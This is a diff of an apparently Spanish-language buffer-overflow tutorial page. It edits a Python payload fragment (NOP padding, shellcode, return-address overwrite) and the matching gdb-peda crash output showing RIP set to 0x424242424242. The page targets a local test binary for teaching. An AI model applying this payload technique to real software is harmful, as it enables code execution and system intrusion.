@@ -523,7 +523,7 @@ shellcode </span><span class="kd">+= </span><span class="k">b</span><span class=
 
 junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90" </span><span class="kd">*</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))
 
-rip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 4
+rip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 6
 
 </span><span class="k">print</span><span class="p">(junk </span><span class="kd">+ </span><span class="p">shellcode</span><span class="kd"> +</span><span class="p"> rip)</span>
 </code></pre></div></div><br>
@@ -549,7 +549,7 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="s2">RDI</span><span class="p">: </span><span class="s2">0x7fffffffe450</span><span class="p"> --> 0x9090909090909090 
 </span><span class="s2">RBP</span><span class="p">: 0x50f5e5457525f54 
 </span><span class="s2">RSP</span><span class="p">: </span><span class="na">0x7fffffffe4e0 </span><span class="p">--> </span><span class="na">0x7fffffffe608 </span><span class="p">--></span><span class="na"> 0x7fffffffe920</span><span class="p"> ("./example")
-</span><span class="s2">RIP</span><span class="p">: 0x42424242 ('BBBB')
+</span><span class="s2">RIP</span><span class="p">: 0x424242424242 ('BBBBBB')
 </span><span class="s2">R8 </span><span class="p">: 0xfefefefefefefeff 
 </span><span class="s2">R9 </span><span class="p">: 0xffffffffffff0000 
 </span><span class="s2">R10</span><span class="p">: </span><span class="s2">0x7ffff7dd2240 </span><span class="p">--> 0x10001a00004298 
@@ -573,8 +573,8 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="na">[------------------------------------------------------------------------------]
 </span><span class="p">Legend:</span><span class="kd"> code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
 Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
-</span><span class="na">0x0000000042424242 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
-gdb-peda$</span>
+</span><span class="na">0x0000424242424242 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
+</span><span class="kd">gdb-peda$</span>
 </code></pre></div></div><br>
 
 <div><p>Leemos de la pila y buscamos una linea intermedia que solo tenga nops para apuntar ahi</p></div>
